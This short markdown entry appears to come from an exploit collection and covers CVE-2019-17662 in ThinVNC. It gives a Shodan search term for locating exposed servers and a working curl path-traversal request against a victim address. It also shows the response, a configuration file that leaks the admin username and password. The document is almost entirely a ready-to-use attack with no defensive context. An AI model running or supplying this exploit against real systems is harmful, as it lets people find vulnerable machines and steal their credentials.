## CVE-2019-17662
### Shodan dorks: <br/>
    "ThinVNC"

	  
### POC:
    curl -k -X 'GET' "http://victim_ip_address:port/a/\../\../thinvnc.ini"
	  
    Response:
    [Authentication]
    Unicode=0
    User=admin
    Password=admin
    Type=Digest
    [Http]
    Port=8080
    Enabled=1
    [Tcp]
    Port=
    [General]
    AutoStart=1
